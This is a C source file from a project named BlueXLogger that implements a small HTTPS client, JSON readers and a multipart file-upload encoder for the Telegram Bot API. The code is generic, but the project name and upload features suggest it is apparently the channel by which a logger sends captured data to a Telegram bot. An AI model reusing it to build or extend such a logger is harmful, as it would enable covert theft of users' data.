/*============================================================================
 * BlueXLogger - src/common/bxl_http.c
 * Minimal HTTPS/1.1 client for the Telegram Bot API.
 *
 * Created by Xencode-CLI by xanthorox
 *==========================================================================*/
#include "bxl_common.h"
#include "bxl_http.h"
#include "bxl_util.h"

#include <stdlib.h>

/*==========================================================================
 * Response lifecycle
 *========================================================================*/
void bxl_http_response_free(BxlHttpResponse *res)
{
    if (!res) return;
    free(res->body);
    res->body = NULL;
    res->body_len = 0;
}

static void http_reset(BxlHttpResponse *res)
{
    memset(res, 0, sizeof(*res));
}

static void http_fail(BxlHttpResponse *res, const char *fmt, ...)
{
    va_list ap;

    res->ok = BXL_FALSE;
    va_start(ap, fmt);
    StringCchVPrintfA(res->error, sizeof(res->error), fmt, ap);
    va_end(ap);
}

/*==========================================================================
 * Case-insensitive substring search, bounded to a length
 *========================================================================*/
static const char *mem_find_ci(const char *hay, size_t hay_len,
                               const char *needle)
{
    size_t nlen = strlen(needle);
    size_t i;

    if (nlen == 0 || hay_len < nlen) return NULL;

    for (i = 0; i + nlen <= hay_len; i++) {
        size_t j;
        for (j = 0; j < nlen; j++) {
            char a = hay[i + j];
            char b = needle[j];
            if (a >= 'A' && a <= 'Z') a = (char)(a - 'A' + 'a');
            if (b >= 'A' && b <= 'Z') b = (char)(b - 'A' + 'a');
            if (a != b) break;
        }
        if (j == nlen) return hay + i;
    }
    return NULL;
}

/*==========================================================================
 * Chunked transfer-encoding
 *========================================================================*/
/*
 * Decode a chunked body into out. Returns BXL_TRUE on success.
 *
 * Telegram replies carry Content-Length, but a TLS-terminating proxy in front
 * of the API is free to re-frame the response as chunked. Failing to decode
 * that would look like an empty reply rather than a transport quirk, so it is
 * worth the thirty lines.
 */
static int decode_chunked(const char *in, size_t in_len, BxlBuf *out)
{
    size_t pos = 0;

    for (;;) {
        size_t line_end = pos;
        size_t chunk_len = 0;
        int    digits = 0;

        /* Find the end of the size line. */
        while (line_end + 1 < in_len &&
               !(in[line_end] == '\r' && in[line_end + 1] == '\n'))
            line_end++;
        if (line_end + 1 >= in_len) return BXL_FALSE;   /* truncated */

        /* Parse the hex size, ignoring any ";ext=value" suffix. */
        {
            size_t i = pos;
            for (; i < line_end; i++) {
                char c = in[i];
                int  d;
                if (c == ';') break;
                if (c >= '0' && c <= '9')      d = c - '0';
                else if (c >= 'a' && c <= 'f') d = c - 'a' + 10;
                else if (c >= 'A' && c <= 'F') d = c - 'A' + 10;
                else if (c == ' ' || c == '\t') continue;
                else return BXL_FALSE;              /* malformed */
                chunk_len = chunk_len * 16 + (size_t)d;
                digits++;
                if (chunk_len > BXL_HTTP_MAX_BODY) return BXL_FALSE;
            }
        }
        if (!digits) return BXL_FALSE;

        pos = line_end + 2;

        if (chunk_len == 0) return BXL_TRUE;            /* last chunk */

        if (pos + chunk_len > in_len) return BXL_FALSE; /* truncated */
        if (!bxl_buf_append(out, in + pos, chunk_len)) return BXL_FALSE;
        pos += chunk_len;

        /* Each chunk is followed by its own CRLF. */
        if (pos + 1 < in_len && in[pos] == '\r' && in[pos + 1] == '\n')
            pos += 2;
    }
}

/*==========================================================================
 * Request
 *========================================================================*/
static int http_perform(const char *method,
                        const char *host, int port, const char *path,
                        const char *content_type,
                        const void *body, size_t body_len,
                        int timeout_ms, BxlHttpResponse *res)
{
    BxlNet  n;
    BxlBuf  req;
    BxlBuf  raw;
    BxlBuf  out;
    int     rc = BXL_FALSE;
    size_t  header_end = 0;
    int     status = 0;

    if (!res) return BXL_FALSE;
    http_reset(res);

    if (!host || !path) { http_fail(res, "missing host or path"); return BXL_FALSE; }

    if (!bxl_buf_init(&req, 1024)) { http_fail(res, "out of memory"); return BXL_FALSE; }
    if (!bxl_buf_init(&raw, 8192)) { bxl_buf_free(&req); http_fail(res, "out of memory"); return BXL_FALSE; }
    if (!bxl_buf_init(&out, 8192)) { bxl_buf_free(&raw); bxl_buf_free(&req); http_fail(res, "out of memory"); return BXL_FALSE; }

    if (!bxl_net_startup()) {
        http_fail(res, "winsock startup failed");
        goto done;
    }

    bxl_net_init(&n);
    bxl_net_set_timeout(&n, timeout_ms > 0 ? timeout_ms : 20000);

    if (!bxl_net_connect(&n, host, port)) {
        http_fail(res, "connect to %s:%d failed: %s", host, port, bxl_net_error(&n));
        bxl_net_close(&n);
        goto done;
    }

    /* The Bot API is HTTPS only: TLS is negotiated before a single byte of
     * request is written. */
    if (!bxl_net_starttls(&n, host)) {
        http_fail(res, "TLS handshake with %s failed: %s", host, bxl_net_error(&n));
        bxl_net_close(&n);
        goto done;
    }

    /* ---- request ------------------------------------------------------- */
    if (!bxl_buf_appendf(&req, "%s %s HTTP/1.1\r\n", method, path) ||
        !bxl_buf_appendf(&req, "Host: %s\r\n", host) ||
        !bxl_buf_appendf(&req, "User-Agent: BlueXLogger/1.0\r\n") ||
        !bxl_buf_appendf(&req, "Accept: */*\r\n") ||
        !bxl_buf_appendf(&req, "Connection: close\r\n") ||
        !bxl_buf_appendf(&req, "Content-Length: %llu\r\n",
                         (unsigned long long)body_len)) {
        http_fail(res, "out of memory building request");
        bxl_net_close(&n);
        goto done;
    }

    if (content_type && content_type[0]) {
        if (!bxl_buf_appendf(&req, "Content-Type: %s\r\n", content_type)) {
            http_fail(res, "out of memory building request");
            bxl_net_close(&n);
            goto done;
        }
    }

    if (!bxl_buf_appends(&req, "\r\n")) {
        http_fail(res, "out of memory building request");
        bxl_net_close(&n);
        goto done;
    }

    if (!bxl_net_send(&n, req.data, req.len)) {
        http_fail(res, "send failed: %s", bxl_net_error(&n));
        bxl_net_close(&n);
        goto done;
    }

    if (body && body_len) {
        if (!bxl_net_send(&n, body, body_len)) {
            http_fail(res, "send of body failed: %s", bxl_net_error(&n));
            bxl_net_close(&n);
            goto done;
        }
    }

    /* ---- response ------------------------------------------------------ */
    for (;;) {
        char  buf[8192];
        int   got = bxl_net_recv(&n, buf, sizeof(buf));

        if (got < 0) {
            /* A read error after some data is common when the peer closes
             * without a clean TLS shutdown; keep what arrived. */
            if (raw.len == 0) {
                http_fail(res, "receive failed: %s", bxl_net_error(&n));
                bxl_net_close(&n);
                goto done;
            }
            break;
        }
        if (got == 0) break;                      /* orderly close */

        if (!bxl_buf_append(&raw, buf, (size_t)got)) {
            http_fail(res, "response too large");
            bxl_net_close(&n);
            goto done;
        }
        if (raw.len > BXL_HTTP_MAX_BODY * 2) {
            http_fail(res, "response exceeded the size cap");
            bxl_net_close(&n);
            goto done;
        }
    }

    bxl_net_close(&n);

    /* ---- status line --------------------------------------------------- */
    if (raw.len < 12) {
        http_fail(res, "empty or truncated response");
        goto done;
    }
    if (memcmp(raw.data, "HTTP/", 5) != 0) {
        http_fail(res, "not an HTTP response");
        goto done;
    }
    {
        const char *sp = (const char *)memchr(raw.data, ' ', raw.len);
        if (sp) status = atoi(sp + 1);
    }
    if (status < 100 || status > 599) {
        http_fail(res, "unparseable status line");
        goto done;
    }
    res->status = status;

    /* ---- split headers from body --------------------------------------- */
    {
        const char *hdr = mem_find_ci(raw.data, raw.len, "\r\n\r\n");
        if (!hdr) {
            http_fail(res, "headers not terminated");
            goto done;
        }
        header_end = (size_t)(hdr - raw.data) + 4;
    }

    /* ---- transfer framing ---------------------------------------------- */
    {
        size_t hdr_len = header_end - 4;   /* exclude the blank line */
        int    chunked = 0;
        long   content_length = -1;

        if (mem_find_ci(raw.data, hdr_len, "transfer-encoding:") &&
            mem_find_ci(raw.data, hdr_len, "chunked"))
            chunked = 1;

        {
            const char *cl = mem_find_ci(raw.data, hdr_len, "content-length:");
            if (cl) content_length = atol(cl + 15);
        }

        if (chunked) {
            if (!decode_chunked(raw.data + header_end, raw.len - header_end, &out)) {
                http_fail(res, "malformed chunked body");
                goto done;
            }
        } else if (content_length >= 0) {
            size_t avail = raw.len - header_end;
            size_t take  = (size_t)content_length;

            /* Trust the shorter of the two: a server that under-delivers is
             * more likely than one that pads, and over-reading would append
             * bytes that are not part of the message. */
            if (take > avail) take = avail;
            if (take > BXL_HTTP_MAX_BODY) {
                http_fail(res, "body exceeded the size cap");
                goto done;
            }
            if (!bxl_buf_append(&out, raw.data + header_end, take)) {
                http_fail(res, "out of memory storing body");
                goto done;
            }
        } else {
            /* Neither header: take everything after the blank line. This is
             * what a "Connection: close" reply with no length looks like. */
            size_t avail = raw.len - header_end;
            if (avail > BXL_HTTP_MAX_BODY) avail = BXL_HTTP_MAX_BODY;
            if (!bxl_buf_append(&out, raw.data + header_end, avail)) {
                http_fail(res, "out of memory storing body");
                goto done;
            }
        }
    }

    /* Guarantee NUL termination for the JSON helpers, which are byte-oriented
     * but still expect a terminator when scanning for the final token. */
    if (!bxl_buf_appendc(&out, '\0')) {
        http_fail(res, "out of memory terminating body");
        goto done;
    }
    out.len--;                            /* do not count the terminator */

    res->body     = bxl_buf_detach(&out, &res->body_len);
    if (!res->body) {
        http_fail(res, "out of memory handing over body");
        goto done;
    }

    res->ok = BXL_TRUE;
    rc = BXL_TRUE;

done:
    bxl_buf_free(&out);
    bxl_buf_free(&raw);
    bxl_buf_free(&req);
    return rc;
}

int bxl_http_post(const char *host, int port, const char *path,
                  const char *content_type,
                  const void *body, size_t body_len,
                  int timeout_ms, BxlHttpResponse *res)
{
    return http_perform("POST", host, port, path, content_type,
                        body, body_len, timeout_ms, res);
}

int bxl_http_get(const char *host, int port, const char *path,
                 int timeout_ms, BxlHttpResponse *res)
{
    /* A GET carries no body, but Content-Length: 0 is still sent: some
     * front-ends treat a request without it as a malformed HTTP/1.1
     * message and close the connection before replying. */
    return http_perform("GET", host, port, path, NULL, NULL, 0,
                        timeout_ms, res);
}

/*==========================================================================
 * Shallow JSON readers
 *========================================================================*/
/* Append a code point to a UTF-8 buffer. */
static int utf8_append_cp(BxlBuf *b, unsigned cp)
{
    char tmp[4];

    if (cp < 0x80) {
        tmp[0] = (char)cp;
        return bxl_buf_append(b, tmp, 1);
    }
    if (cp < 0x800) {
        tmp[0] = (char)(0xC0 | (cp >> 6));
        tmp[1] = (char)(0x80 | (cp & 0x3F));
        return bxl_buf_append(b, tmp, 2);
    }
    if (cp < 0x10000) {
        tmp[0] = (char)(0xE0 | (cp >> 12));
        tmp[1] = (char)(0x80 | ((cp >> 6) & 0x3F));
        tmp[2] = (char)(0x80 | (cp & 0x3F));
        return bxl_buf_append(b, tmp, 3);
    }
    tmp[0] = (char)(0xF0 | (cp >> 18));
    tmp[1] = (char)(0x80 | ((cp >> 12) & 0x3F));
    tmp[2] = (char)(0x80 | ((cp >> 6) & 0x3F));
    tmp[3] = (char)(0x80 | (cp & 0x3F));
    return bxl_buf_append(b, tmp, 4);
}

static int hex4(const char *p, unsigned *out)
{
    unsigned v = 0;
    int      i;

    for (i = 0; i < 4; i++) {
        char c = p[i];
        unsigned d;
        if (c >= '0' && c <= '9')      d = (unsigned)(c - '0');
        else if (c >= 'a' && c <= 'f') d = (unsigned)(c - 'a' + 10);
        else if (c >= 'A' && c <= 'F') d = (unsigned)(c - 'A' + 10);
        else return BXL_FALSE;
        v = v * 16 + d;
    }
    *out = v;
    return BXL_TRUE;
}

/* Locate the value position for "key": the index of the first byte after the
 * colon. Returns NULL when the key is absent or is not followed by a colon. */
static const char *json_value_of(const char *json, const char *key)
{
    char  pat[128];
    size_t plen;
    const char *p;

    if (!json || !key) return NULL;
    if (StringCchPrintfA(pat, sizeof(pat), "\"%s\"", key) < 0) return NULL;
    plen = strlen(pat);

    p = json;
    for (;;) {
        const char *hit = strstr(p, pat);
        const char *q;

        if (!hit) return NULL;
        q = hit + plen;
        while (*q == ' ' || *q == '\t' || *q == '\r' || *q == '\n') q++;
        if (*q == ':') {
            q++;
            while (*q == ' ' || *q == '\t' || *q == '\r' || *q == '\n') q++;
            return q;
        }
        p = hit + plen;      /* keep looking: this was a value, not a key */
    }
}

int bxl_json_get_string(const char *json, const char *key,
                        char *out, size_t out_cch)
{
    const char *v;
    BxlBuf      b;

    if (!out || !out_cch) return BXL_FALSE;
    out[0] = 0;

    v = json_value_of(json, key);
    if (!v || *v != '"') return BXL_FALSE;
    v++;

    if (!bxl_buf_init(&b, 128)) return BXL_FALSE;

    while (*v && *v != '"') {
        if (*v == '\\') {
            v++;
            switch (*v) {
            case '"':  bxl_buf_appendc(&b, '"');  v++; break;
            case '\\': bxl_buf_appendc(&b, '\\'); v++; break;
            case '/':  bxl_buf_appendc(&b, '/');  v++; break;
            case 'b':  bxl_buf_appendc(&b, '\b'); v++; break;
            case 'f':  bxl_buf_appendc(&b, '\f'); v++; break;
            case 'n':  bxl_buf_appendc(&b, '\n'); v++; break;
            case 'r':  bxl_buf_appendc(&b, '\r'); v++; break;
            case 't':  bxl_buf_appendc(&b, '\t'); v++; break;
            case 'u': {
                unsigned cp;
                if (!hex4(v + 1, &cp)) { v++; break; }
                v += 5;
                /* A surrogate pair arrives as two \u escapes. */
                if (cp >= 0xD800 && cp <= 0xDBFF && v[0] == '\\' && v[1] == 'u') {
                    unsigned lo;
                    if (hex4(v + 2, &lo) && lo >= 0xDC00 && lo <= 0xDFFF) {
                        cp = 0x10000 + ((cp - 0xD800) << 10) + (lo - 0xDC00);
                        v += 6;
                    }
                }
                utf8_append_cp(&b, cp);
                break;
            }
            default:
                /* Unknown escape: keep the character verbatim. */
                if (*v) { bxl_buf_appendc(&b, *v); v++; }
                break;
            }
        } else {
            bxl_buf_appendc(&b, *v);
            v++;
        }
    }

    if (!bxl_buf_appendc(&b, '\0')) { bxl_buf_free(&b); return BXL_FALSE; }
    b.len--;

    /* Copy out, truncating rather than failing when the caller's buffer is
     * small: a long error description should still surface, just clipped. */
    {
        size_t n = b.len < out_cch - 1 ? b.len : out_cch - 1;
        memcpy(out, b.data, n);
        out[n] = 0;
    }

    bxl_buf_free(&b);
    return BXL_TRUE;
}

int bxl_json_get_bool(const char *json, const char *key, int *out)
{
    const char *v = json_value_of(json, key);

    if (!v || !out) return BXL_FALSE;
    if (strncmp(v, "true", 4) == 0)  { *out = 1; return BXL_TRUE; }
    if (strncmp(v, "false", 5) == 0) { *out = 0; return BXL_TRUE; }
    return BXL_FALSE;
}

int bxl_json_get_int(const char *json, const char *key, long *out)
{
    const char *v = json_value_of(json, key);

    if (!v || !out) return BXL_FALSE;
    if ((*v < '0' || *v > '9') && *v != '-') return BXL_FALSE;
    *out = strtol(v, NULL, 10);
    return BXL_TRUE;
}

/*==========================================================================
 * multipart/form-data
 *========================================================================*/
#define BXL_MP_BOUNDARY "----BlueXLoggerBoundary"

struct BxlMultipart {
    BxlBuf buf;                     /* the encoded form                     */
    char   boundary[80];
    char   ctype[128];
    int    closed;                  /* closing delimiter already written    */
};

BxlMultipart *bxl_mp_begin(void)
{
    BxlMultipart *mp = (BxlMultipart *)calloc(1, sizeof(*mp));
    char          seed[64];

    if (!mp) return NULL;
    if (!bxl_buf_init(&mp->buf, 8192)) { free(mp); return NULL; }

    /* The boundary must not collide with the payload. A timestamp plus a
     * per-process value is enough: we are framing one request, not generating
     * a document that must stay unambiguous across systems. */
    StringCchPrintfA(seed, sizeof(seed), "%s%llu",
                     BXL_MP_BOUNDARY,
                     (unsigned long long)(bxl_now_ms() ^ (bxl_u64)(uintptr_t)mp));
    StringCchCopyA(mp->boundary, sizeof(mp->boundary), seed);
    StringCchPrintfA(mp->ctype, sizeof(mp->ctype),
                     "multipart/form-data; boundary=%s", mp->boundary);

    return mp;
}

static int mp_boundary(BxlMultipart *mp, int last)
{
    if (!bxl_buf_appends(&mp->buf, "--") ||
        !bxl_buf_appends(&mp->buf, mp->boundary))
        return BXL_FALSE;
    if (last) return bxl_buf_appends(&mp->buf, "--\r\n");
    return bxl_buf_appends(&mp->buf, "\r\n");
}

int bxl_mp_add_field(BxlMultipart *mp, const char *name, const char *value)
{
    if (!mp || !name || !value) return BXL_FALSE;

    if (!mp_boundary(mp, 0)) return BXL_FALSE;
    if (!bxl_buf_appendf(&mp->buf,
            "Content-Disposition: form-data; name=\"%s\"\r\n\r\n", name))
        return BXL_FALSE;
    if (!bxl_buf_appends(&mp->buf, value)) return BXL_FALSE;
    return bxl_buf_appends(&mp->buf, "\r\n");
}

int bxl_mp_add_file(BxlMultipart *mp, const char *name, const char *filename,
                    const char *mime, const void *data, size_t len)
{
    if (!mp || !name || !filename || !data) return BXL_FALSE;

    if (!mp_boundary(mp, 0)) return BXL_FALSE;
    if (!bxl_buf_appendf(&mp->buf,
            "Content-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n",
            name, filename))
        return BXL_FALSE;
    if (!bxl_buf_appendf(&mp->buf, "Content-Type: %s\r\n\r\n",
                         mime && mime[0] ? mime : "application/octet-stream"))
        return BXL_FALSE;
    if (!bxl_buf_append(&mp->buf, data, len)) return BXL_FALSE;
    return bxl_buf_appends(&mp->buf, "\r\n");
}

const char *bxl_mp_data(BxlMultipart *mp, size_t *len_out)
{
    if (!mp) return NULL;

    /* Closing delimiter, written exactly once. A flag is used rather than
     * sniffing the tail bytes: the tail of "--<boundary>--\r\n" is not "--\r\n"
     * unless the boundary happens to end that way, so a sniff would append a
     * second delimiter on every call. */
    if (!mp->closed) {
        if (!mp_boundary(mp, 1)) return NULL;
        mp->closed = 1;
    }

    if (len_out) *len_out = mp->buf.len;
    return mp->buf.data;
}

const char *bxl_mp_content_type(BxlMultipart *mp)
{
    return mp ? mp->ctype : NULL;
}

void bxl_mp_free(BxlMultipart *mp)
{
    if (!mp) return;
    bxl_buf_free(&mp->buf);
    free(mp);
}
